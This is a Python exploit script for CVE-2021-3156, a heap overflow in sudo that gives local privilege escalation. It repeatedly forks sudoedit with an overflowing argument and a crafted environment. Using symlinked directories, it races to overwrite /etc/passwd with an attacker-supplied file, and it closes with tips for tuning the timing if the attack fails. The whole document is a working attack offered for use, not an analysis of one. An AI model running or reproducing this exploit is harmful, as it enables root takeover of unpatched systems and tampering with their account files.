#!/usr/bin/env python3
"""
Sudo Privilege Escalation / Heap Overflow - CVE-2021-3156
Author: West Shepherd (ported/cleaned)
Usage: python3 exploit_sudo_cve3156.py -source /path/to/malicious_passwd [-target /etc/passwd] [-sleep 0.01]
"""

import os
import pwd
import time
import sys
import argparse


class Exploit(object):
    def __init__(self, source, target, sleep):
        self.sleep = sleep
        self.source = source
        self.target = target
        self.username = ''
        self.size = 0
        self.data = ''

    @staticmethod
    def readFile(path):
        with open(path, 'r', errors='ignore') as f:
            return f.read()

    @staticmethod
    def getUser():
        return pwd.getpwuid(os.getuid())[0]

    @staticmethod
    def getSize(path):
        try:
            return os.stat(path).st_size
        except Exception:
            return -1

    def main(self):
        self.username = self.getUser()
        self.data = self.readFile(self.source)
        self.size = self.getSize(self.target)

        # Prepare environment similar to original PoC
        exploit_environ = {
            '\n\n\n\n\n': '\n' + self.data,
            'SUDO_ASKPASS': '/bin/false',
            'LANG': 'C.UTF-8@' + ('a' * 63),
            'A': 'A' * 0xffff
        }

        # We'll attempt multiple iterations as original exploit does
        for i in range(5000):
            directory = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA00000000000000000000000000%08d' % i
            overflow = '1' * 56 + directory

            if os.path.exists(directory):
                sys.stdout.write('file exists %s\n' % directory)
                sys.stdout.flush()
                continue

            child = os.fork()
            if child:
                # Parent
                sys.stdout.write('[+] parent %d \n' % i)
                sys.stdout.flush()
                time.sleep(self.sleep)
                if not os.path.exists(directory):
                    try:
                        os.mkdir(directory, 0o700)
                        os.symlink(self.target, '%s/%s' % (directory, self.username))
                        # Wait for child to exit; prevent zombies
                        os.waitpid(child, 0)
                    except Exception:
                        # ignore and continue
                        continue
            else:
                # Child
                sys.stdout.write('[+] child %d \n' % i)
                sys.stdout.flush()
                # reduce priority for child to mimic original
                try:
                    os.setpriority(os.PRIO_PROCESS, 0, 20)
                except Exception:
                    pass
                # apply exploit environment on top of current env to preserve PATH etc.
                newenv = os.environ.copy()
                newenv.update(exploit_environ)

                # exec sudoedit with crafted args; note: argv uses literal backslash and overflow
                argv = ['/usr/bin/sudoedit', '-A', '-s', '\\', overflow]
                try:
                    os.execve('/usr/bin/sudoedit', argv, newenv)
                except Exception as e:
                    sys.stdout.write('[!] execve failed: %s\n' % str(e))
                    sys.stdout.flush()
                    os._exit(1)

            # check if target size changed indicating success
            if self.size != self.getSize(self.target):
                sys.stdout.write('[*] success at iteration %d \n' % i)
                sys.stdout.flush()
                break

        sys.stdout.write(
            "\nConsider the following if the exploit fails:\n"
            "\t(1) If all directories are owned by root then sleep needs to be decreased.\n"
            "\t(2) If they're all owned by you, then sleep needs increased.\n"
        )


def parse_args():
    parser = argparse.ArgumentParser(
        add_help=True,
        description='* Sudo Privilege Escalation / Heap Overflow - CVE-2021-3156 *'
    )
    parser.add_argument('-source', required=True, help='Path to malicious "passwd" file to overwrite the target')
    parser.add_argument('-target', default='/etc/passwd', help='Target file path to be overwritten (default: /etc/passwd)')
    parser.add_argument('-sleep', type=float, default=0.01, help='Sleep setting for forked processes (default: 0.01 seconds)')
    return parser.parse_args()


if __name__ == '__main__':
    try:
        options = parse_args()
        exp = Exploit(source=options.source, target=options.target, sleep=options.sleep)
        exp.main()
    except Exception as err:
        sys.stderr.write("Error: %s\n" % str(err))
        sys.exit(1)
